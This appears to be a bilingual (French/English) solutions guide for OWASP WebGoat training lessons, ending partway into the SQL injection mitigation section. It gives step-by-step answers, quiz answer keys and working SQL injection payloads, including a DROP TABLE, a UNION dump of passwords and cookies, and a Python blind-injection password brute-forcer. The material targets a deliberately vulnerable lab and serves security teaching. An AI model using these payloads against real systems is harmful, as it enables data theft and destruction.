<div>
	<h4><u><b>Introduction:</b></u></h4>
	<div>
		<div><br></div>
		<h5>WebGoat</h5>
		<div><br></div>
		<span class="multilang" lang="fr">1. Lire la leçon.</span>
		<span class="multilang" lang="en">1. Read the lesson.</span>
	</div>
	<div>
		<div><br></div>
		<h5>WebWolf</h5>
		<div><br></div>
		3. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Un bug sur WebWolf empêche d'accéder à la <i>Mailbox</i>.
		</span>
		<span class="multilang" lang="en">
		There is a bug on WebWolf that prevents access to <i>Mailbox</i>.
		</span>
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Envoyer un email à <code>{utilisateur}@...</code>.
				</span>
				<span class="multilang" lang="en">
					Send an email to <code>{user}@...</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Aller sur http://host:port/WebWolf.
				</span>
				<span class="multilang" lang="en">
					Go to http://host:port/WebWolf.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					S'identifer puis aller lire le mail reçu.
				</span>
				<span class="multilang" lang="en">
					Log in and go read the mail received.
				</span>
			</li>
		</ul>
		<div><br></div>
		4.
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Cliquer sur <b>Click here to reset your password</b> et rentrer n'importe quel mot de passe.
				</span>
				<span class="multilang" lang="en">
					Send an email to <code>{user}@...</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Aller sur http://host:port/WebWolf/requests.
				</span>
				<span class="multilang" lang="en">
					Go to http://host:port/WebWolf/requests.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Observer dans la requête le paramètre <code>uniqueCode</code> et rentrer se valeur sur <b>WebGoat</b>.
				</span>
				<span class="multilang" lang="en">
					Observe the <code> uniqueCode </code> parameter in the query and enter its value on <b>WebGoat</b>.
				</span>
			</li>
		</ul>
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>General:</b></u></h4>
	<div>
		<div><br></div>
		<h5>HTTP Basics</h5>
		<div><br></div>
		2.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Type in your name and press 'go'
		<div><br></div>
		<span class="multilang" lang="fr">
			Entrer un nom et appuyer sur <b>Go!</b>.
			<br>
		</span>
		<span class="multilang" lang="en">
			Enter your name and press <b>Go!</b>.
			<br>
		</span>
		<div><br></div>
		3.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Turn on Show Parameters or other features
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try to intercept the request with OWASP ZAP
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Remplir les champs sur <b>WebGoat</b> avec <code>POST</code> ou <code>GET</code> et un nombre aléatoire, 
					et cliquer sur <b>Go!</b>.
				</span>
				<span class="multilang" lang="en">
					Fill out the fields on <b>WebGoat</b> with <code>POST</code> or <code> GET</code> and a random number,
					and click on <b>Go!</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>attack2</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>attack2</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Récupérer le <code>magic_num</code> dans le corps de la requête, repérer que la requête est un <code>POST</code> 
					et recliquer sur <b>Go!</b> avec les bons paramètres.
				</span>
				<span class="multilang" lang="en">
					Retrieve the <code>magic_num</code> in the body of the request,
					find that the request is a <code>POST</code> and click again on <b>Go!</b> with the correct parameters.
				</span>
			</li>
		</ul>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/999658178/http-basics.png" alt="HTTP Basics" class="atto_image_button_text-bottom" width="800" height="320">
	</div>
	<div>
		<div><br></div>
		<h5>HTTP Proxies</h5>
		<div><br></div>
		6.
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Cliquer sur <b>Submit</b> en laissant le paramètre intact. 
				</span>
				<span class="multilang" lang="en">
					Click on <b>Submit</b> without editing the parameter.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>intercept-request</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Modifier et renvoyer</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>intercept-request</code> in the <i>Network</i> tab and click on <i>Edit and Resend</i>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Changer la méthode de <code>POST</code> à <code>GET</code>.
				</span>
				<span class="multilang" lang="en">
					Change the <code>POST</code> method to <code>GET</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Changer l'URL de http://host:port/WebGoat/HttpProxies/intercept-request à
					<a href="http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily"></a>http://host:port/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily</a>.
				</span>
				<span class="multilang" lang="en">
					Change the URL from http://host:port/WebGoat/HttpProxies/intercept-request to
					<a href="http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily">http://host/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily</a>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Ajouter dans les en-têtes de requête <code>x-request-intercepted:true</code>.
				</span>
				<span class="multilang" lang="en">
					Add in the request header <code>x-request-intercepted: true</code>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Effacer le corps de la requête.
				</span>
				<span class="multilang" lang="en">
					Clear the body of the query.
				</span>
			</li>
		</ul>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/603027896/http-proxies.png" alt="HTTP Proxies" class="img-responsive atto_image_button_text-bottom" width="800" height="410">
	</div>
	<div>
		<div><br></div>
		<h5>CIA triad</h5>
		<div><br></div>
		5.
		<div><br></div>
		<b>1. How could an intruder harm the security goal of confidentiality?</b>
		<div><br></div>
		Solution 3: By stealing a database where names and emails are stored and uploading it to a website.
		<div><br></div>
		<b>2. How could an intruder harm the security goal of integrity?</b>
		<div><br></div>
		Solution 1: By changing the names and emails of one or more users stored in a database.
		<div><br></div>
		<b>3. How could an intruder harm the security goal of availability?</b>
		<div><br></div>
		Solution 4: By launching a denial of service attack on the servers.
		<div><br></div>
		<b>4. What happens if at least one of the CIA security goals is harmed?</b>
		<div><br></div>
		Solution 2: The systems security is compromised even if only one goal is harmed.
		<div><br></div>
	</div>
	<div>
		<div><br></div>
		<h5>Google Chrome Developer Tools</h5>
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Console</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Console</i> tab.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Dans la console, entrer <code>webgoat.customjs.phoneHome()</code>
				</span>
				<span class="multilang" lang="en">
					Enter <code>webgoat.customjs.phoneHome()</code> in the console.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/485686248/google-chrome-dev-tools-4.png" alt="Google Chrome Dev Tools 4" class="img-responsive atto_image_button_text-bottom" width="800" height="121">
		<div><br></div>
		6. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/523703559/warning.png" alt="Warning" class="img-responsive atto_image_button_text-bottom" width="24" height="24"> 
		<span class="multilang" lang="fr">
		Contrairement à ce que les indices disent, la requête ne s'appelle pas <code>dummy</code>, mais <code>network</code>.
		</span>
		<span class="multilang" lang="en">
		Contrary to what the hints say, the name of the request is not <code>dummy</code>, but <code>network</code>.
		</span>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Clear all Requests from the network button, then make the request. The you should be able to figure out, which request holds the data.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The name of the request is "dummy"
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
				</span>
				<span class="multilang" lang="en">
					Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Sur WebGoat, cliquer sur <b>Go!</b>.
				</span>
				<span class="multilang" lang="en">
					On <b>WebGoat</b> click on <b>Go!</b>.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
					Repérer la requête vers <code>network</code> dans l'onglet <i>Réseau</i> et cliquer sur <i>Paramètres</i>.
				</span>
				<span class="multilang" lang="en">
					Locate the query to <code>network</code> in the <i>Network</i> tab and click on <i>Parameters</i>.
				</span>
			</li>
		</ul>
		<div><br></div>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/390940719/google-chrome-dev-tools-6.png" alt="Google Chrome Dev Tools 6" class="img-responsive atto_image_button_text-bottom" width="800" height="117">
	</div>
</div>

<div><br></div>
<div><br></div>

<div>
	<h4><u><b>(A1) Injection:</b></u></h4>
	<div><br></div>
	<div>
		<h5>SQL Injection (introduction)</h5>
		<div><br></div>
		2. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You want the data from the column with the name department. You know the database name (employees) and you know the first- and lastname of the employee (first_name, last_name).
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		SELECT column FROM tablename WHERE condition;
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Use ' instead of " when comparing two strings.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Pay attention to case sensitivity when comparing two strings.
		<div><br></div>
		<b>SQL query</b>: <code>SELECT department FROM employees WHERE first_name='Bob'</code>
		<div><br></div>
		3. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try the UPDATE statement
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		UPDATE table name SET column name=value WHERE condition;
		<div><br></div>
		<b>SQL query</b>: <code>UPDATE employees SET department='Sales' WHERE first_name='Tobi'</code>
		<div><br></div>
		4. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		ALTER TABLE alters the structure of an existing database 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Do not forget the data type of the new column (e.g. varchar(size) or int(size)) 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		ALTER TABLE table name ADD column name data type(size); 
		<div><br></div>
		<b>SQL query</b>: <code>ALTER TABLE employees ADD phone varchar(20)</code>
		<div><br></div>
		5. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look at the example. There is everything you will need. 
		<div><br></div>
		<b>SQL query</b>: <code>GRANT ALTER TABLE TO UnauthorizedUser</code>
		<div><br></div>
		9. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Remember that for an successful Sql-Injection the query needs to always evaluate to true. 
		<div><br></div>
		<b>SELECT * FROM users_data FIRST_NAME = 'John' and Last_NAME = '</b> <code>'</code> + <code>or</code> + <code>'1'='1</code>
		<div><br></div>
		10. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try to check which of the input fields is susceptible to an injection attack. 		
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Insert: 0 or 1 = 1 into the first input field. The output should tell you if this field is injectable. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The first input field is not susceptible to sql injection. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		You do not need to insert any quotations into your injection-string. 
		<div><br></div>
		<ul>
			<li>
				<b>Login_count</b>: <code>0</code>
			</li>
			<li>
				<b>User_Id</b>: <code>0 OR 1=1</code>
			</li>
		</ul>
		11. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The application is taking your input and inserting the values into the variables 'name' and 'auth_tan' of the pre-formed SQL command.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Compound SQL statements can be made by expanding the WHERE clause of the statement with keywords like AND and OR.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try appending a SQL statement that always resolves to true.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Make sure all quotes (" ' ") are opened and closed properly so the resulting SQL query is syntactically correct. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try extending the WHERE clause of the statement by adding something like: ' OR '1' = '1. 
		<div><br></div>
		<ul>
			<li>
				<b>Employee Name</b>: <code>A</code>
			</li>
			<li>
				<b>Authentication TAN</b>: <code>' OR '1' = '1</code>
			</li>
		</ul>
		12. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try to find a way, to chain another query to the end of the existing one. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Use the ; metacharacter to do so. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Make use of DML to change your salary. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Make sure that the resulting query is syntactically correct. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		How about something like '; UPDATE employees.... 
		<div><br></div>
		<ul>
			<li>
				<b>Employee Name</b>: <code>A</code>
			</li>
			<li>
				<b>Authentication TAN</b>: <code>'; UPDATE employees SET salary=99999 WHERE first_name='John</code>
			</li>
		</ul>
		13. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Use the techniques that you have learned before. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The application takes your input and filters for entries that are LIKE it. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Try query chaining to reach the goal. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The DDL allows you to delete (DROP) database tables. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The underlying SQL query looks like that: "SELECT * FROM access_log WHERE action LIKE '%" + action + "%'". 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Remember that you can use the -- metacharacter to comment out the rest of the line. 
		<div><br></div>
		<b>Action contains</b>: <code>%'; DROP TABLE access_log;--</code>
		<div><br></div>
	</div>
	<div>
		<div><br></div>
		<h5>SQL Injection (advanced)</h5>
		<div><br></div>
		3.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Remember that when using an UNION each SELECT statement within UNION must have the same number of columns. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The data type of a column in the first SELECT statement must have a similar data type to that in the second SELECT statement. 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Your new SQL query must end with a comment. eg: -- 
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		If a column needs a String you could substitute something like 'a String' for it. For integers you could substitute a 1. 
		<div><br></div>
		<ul>
			<li>
				<span class="multilang" lang="fr">
					Name: <code>'; SELECT * FROM user_system_data;--</code> ou <code>' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--</code>
				</span>
				<span class="multilang" lang="en">
					Name: <code>'; SELECT * FROM user_system_data;--</code> or <code>' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--</code>
				</span>
			</li>
			<li>
				Password: <code>passW0rD</code>
			</li>
		</ul>
		5.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Look at the different response you receive from the server
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The vulnerability is on the register form
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The vulnerable field is the username field of the register form.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Use tooling to automate this attack
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		The table name is randomized at each start of WebGoat, try to figure out the name first.
		<br>
		<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/375273047/hint.png" alt="Hint" class="img-responsive atto_image_button_text-bottom" width="16" height="16"> 
		Change the password through an UPDATE Statement.
		<div><br></div>
		<span class="multilang" lang="fr">
		Comme spécifié dans les indices, il est possible de changer le mot de passe à l'aide d'un <code>UPDATE</code>.
		Il est aussi possible de retrouver le mot de passe d'origine comme nous allons le voir dans la solution proposée.
		</span>
		<span class="multilang" lang="en">
		As specified in the hints, it is possible to change the password using an <code> UPDATE</code>.
		It is also possible to find the original password as we will see in the proposed solution.
		</span>
		<ul>
			<li>
				<span class="multilang" lang="fr">
				Le formulaire <b>Login</b> ne semble pas fournir de résultats utiles à partir de diverses entrées, mais le formulaire
				<b>Register</b> nous permet de vérifier si un nom d'utilisateur existe déjà.
				</span>
				<span class="multilang" lang="en">
				The <b>Login</b> form does not appear to provide any useful outputs from a variety of inputs,
				but the <b>Register</b> form allows us to check whether a username already exists.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
				Si nous essayons de nous inscrire avec le nom d'utilisateur suivant:
				<code>tom' AND '1'='1</code> nous constatons que le nom d'utilisateur est pris.
				</span>
				<span class="multilang" lang="en">
				If we try to register with the following username: <code>tom' AND '1'='1</code> we find that the username is taken.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
				Nous pouvons utiliser cela comme un oracle et vérifier le mot de passe de Tom, une lettre à la fois.
				</span>
				<span class="multilang" lang="en">
				We can use this as an oracle and check what Tom's password is one at a time.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
				La table que nous recherchons s'appelle <code>password</code> (<i>guessing</i>), 
				nous pouvons donc essayer de nous enregistrer avec le nom d'utilisateur suivant : <code>tom' AND substring(password, 1,1)='t</code>.
				</span>
				<span class="multilang" lang="en">
				Fortunately, the table we are seeking is named <code>password</code> (<i>guessing</i>), so we can attempt to register with the following username:
				<code>tom' AND substring(password,1,1)='t</code>
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
				La réponse indique que le nom d'utilisateur existe déjà,
				nous savons que <b>t</b> est le premier caractère du mot de passe de Tom.
				</span>
				<span class="multilang" lang="en">
				The response states the username already exists, we know that <b>t</b> is the first character of Tom's password.
				</span>
			</li>
			<li>
				<span class="multilang" lang="fr">
				En <i>fuzzing</i> pour les caractères restants,
				nous pouvons déterminer que le mot de passe de Tom est <b>thisisasecretfortomonly</b>.
				</span>
				<span class="multilang" lang="en">
				By fuzzing for the remaining characters, we can determine that Tom's password is <b>thisisasecretfortomonly</b>.
				</span>
			</li>
		</ul>
		<span class="multilang" lang="fr">
			Ce challenge peut être un bon exercice pour s'entraîner au scripting.
			Ci-dessous, un petit exemple de code Python permettant de retrouver la réponse:
		</span>
		<span class="multilang" lang="en">
			This challenge can be a good exercise to practice scripting.
			Below, a small example of Python code to find the answer:
		</span>
		<div><br></div>
		<code>
			import json
			<br>
			import requests
			<br><br>
			def sql_injection_advance_5():
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; alphabet_index = 0
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; alphabet = 'abcdefghijklmnopqrstuvwxyz'
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; password_index = 0
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; password = ''
			<br><br>
			&nbsp;&nbsp;&nbsp;&nbsp; headers = {
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'Cookie': COOKIE,
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; }
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp; while True:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data = {
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'username_reg': payload,
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'email_reg': 'a@a',
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'password_reg': 'a',
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'confirm_password_reg': 'a'
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = requests.put('http://HOST:PORT/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; response = json.loads(r.text)
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; except:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
			<br>
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if "already exists please try to register with a different username" not in response['feedback']:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alphabet_index += 1
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if alphabet_index &gt; len(alphabet) - 1:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else:
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; password += alphabet[alphabet_index]
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print(password)
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alphabet_index = 0
			<br>
			&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; password_index += 1
			<br>
			<br>
			sql_injection_advance_5()
		</code>
	</div>
	<div><br></div>
	<img src="http://moodle.beware.lan/draftfile.php/132/user/draft/682639605/sqli-advanced-5.png" alt="SQLi Advanced 5" class="img-responsive atto_image_button_text-bottom" width="800" height="350">
	<div><br></div>
	6.
	<div><br></div>
	<b>1. What is the difference between a prepared statement and a statement?</b>
	<div><br></div>
	Solution 4: A statement has got values instead of a prepared statement
	<div><br></div>
	<b>2. Which one of the following characters is a placeholder for variables?</b>
	<div><br></div>
	Solution 3: ?
	<div><br></div>
	<b>3. How can prepared statements be faster than statements?</b>
	<div><br></div>
	Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.
	<div><br></div>
	<b>4. How can a prepared statement prevent SQL-Injection?</b>
	<div><br></div>
	Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.
	<div><br></div>
	<b>5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?</b>
	<div><br></div>
	Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.
	<div><br></div>
	<div>
		<div><br></div>
		<h5>SQL Injection (mitigation)</h5>
		<div><br></div>
		5.
		<br>
